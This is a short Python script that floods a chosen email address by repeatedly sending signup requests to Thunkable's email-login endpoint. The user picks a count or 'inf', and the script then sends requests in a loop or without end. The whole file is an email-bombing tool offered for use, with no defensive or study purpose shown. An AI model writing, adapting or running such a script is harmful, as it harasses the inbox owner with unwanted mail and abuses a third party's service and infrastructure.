import requests

email = ''

def sendEmail():
    data = {"email":email,"trackingData":{"isHoc":"null","path":"signup","referrerId":"null"},"platform":"web","currentHours":11,"redirectOptions":{},"amplitudeDeviceId":"cc848a04-709b-43dc-a1ad-8ddcad7c9a49"}

    response = requests.post('https://x.thunkable.com/emaillogin', json=data)

    if response.status_code == 200: print('Email sent')
    else: print(f'\n\nError sending email to {email}.\nError code: {response.status_code}\n\n')

def amountLoop(amount:int, function):
    for _ in range(amount): function()

def infLoop(function):
    while True: function()

while True:
    email = input('What email would you like to send emails to > ')
    amount = input('How many emails should be sent (inf if undefinte) > ')

    if '@' in email and '.' in email:
        match amount:
            case 'inf':
                infLoop(sendEmail)
            case _:
                try: amountLoop(int(amount), sendEmail)
                except: print('Error amount is not inf and not integer.')
